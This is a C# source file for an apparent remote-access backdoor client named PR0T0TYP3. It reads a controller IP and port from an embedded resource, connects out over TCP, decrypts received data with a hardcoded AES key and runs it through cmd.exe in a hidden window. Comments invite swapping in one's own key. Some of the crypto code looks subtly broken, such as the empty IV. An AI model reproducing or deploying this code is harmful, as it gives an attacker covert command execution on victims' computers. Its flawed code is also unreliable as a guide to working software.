using System;
using System.Collections;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net.Sockets;
using System.Reflection;
using System.Resources;
using System.Security.Cryptography;
using System.Text;
using System.Threading.Tasks;

namespace PR0T0TYP3
{
	//This is legit just code, doesn't actually do much here. The temp.resources file is what makes it work, however the resource file here is just a test and doesn't do much
	class PR0T0TYP3_CLIENT
	{
		static void Main(String[] args)
		{
			var assembly = Assembly.GetExecutingAssembly();
			Stream fs = assembly.GetManifestResourceStream("Client.temp.resources");
			var readed = new System.Resources.ResourceReader(fs);
			IDictionaryEnumerator dict = readed.GetEnumerator();
			dict.MoveNext();
			String ipAddress = (String)dict.Value;
			dict.MoveNext();
			int port = Convert.ToInt32((String)dict.Value);

			TcpClient tcpCli = new TcpClient();
			tcpCli.Connect(ipAddress, port);

			while (true)
			{
				String dataRcved = DownloadData(tcpCli);

				System.Diagnostics.Process process = new System.Diagnostics.Process();
				System.Diagnostics.ProcessStartInfo startInfo = new System.Diagnostics.ProcessStartInfo();
				startInfo.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden;
				startInfo.FileName = "cmd.exe";
				startInfo.Arguments = dataRcved;
				process.StartInfo = startInfo;
				process.Start();
			}
			
		}

		public static String DownloadData(TcpClient curClient)
		{
			String dataS = "";
			while (true)
			{
				byte[] data = new byte[4096];
				NetworkStream stream = curClient.GetStream();
				int byteCount = stream.Read(data, 0, data.Length);

				if (byteCount == 0)
				{
					break;
				}

				dataS = decrypt(data);
			}
			if (!String.IsNullOrEmpty(dataS))
				return dataS;
			else
				return null;
		}

		public static byte[] encrypt(String someString)
		{
			byte[] encrypted;

			Aes theAes = Aes.Create();

			theAes.Key = stringToByteArray("dd0ecb45c37b2fa02f7d924de0e48301"); //You may replace this key with any AES 128-bit key

			byte[] IV = { }; //You may replace this with your own IV

			theAes.IV = IV;

			theAes.Mode = CipherMode.CBC;

			var encryptor = theAes.CreateEncryptor(theAes.Key, theAes.IV);

			using (var mem = new MemoryStream())
			{
				using (var crypto = new CryptoStream(mem, encryptor, CryptoStreamMode.Write))
				{
					using (var sWriter = new StreamWriter(crypto))
					{
						sWriter.Write(someString);
						crypto.FlushFinalBlock();
						encrypted = mem.ToArray();
					}
				}
			}
			return encrypted;
		}

		public static byte[] stringToByteArray(String hex)
		{
			int hexLength = hex.Length;
			byte[] bytes = new byte[hexLength / 2];
			for (int i = 0; i < hexLength; i += 2)
				bytes[i / 2] = Convert.ToByte(hex.Substring(i, 2), 16);
			return bytes;
		}

		public static string decrypt(byte[] cipherText)
		{
			using (Aes aesAlg = Aes.Create())
			{
				string decrypted;

				aesAlg.Key = stringToByteArray("dd0ecb45c37b2fa02f7d924de0e48301"); //You may replace this key with any AES 128-bit key

				byte[] IV = { }; //You may replace this with your own IV

				aesAlg.IV = IV;

				aesAlg.Mode = CipherMode.CBC;

				ICryptoTransform decryptor = aesAlg.CreateDecryptor(aesAlg.Key, aesAlg.IV);

				using (var msDecrypt = new MemoryStream(cipherText))
				{
					using (var csDecrypt = new CryptoStream(msDecrypt, decryptor, CryptoStreamMode.Read))
					{
						using (var srDecrypt = new StreamReader(csDecrypt))
						{
							decrypted = srDecrypt.ReadToEnd();
						}
					}
				}
				return decrypted;
			}
		}
	}
}
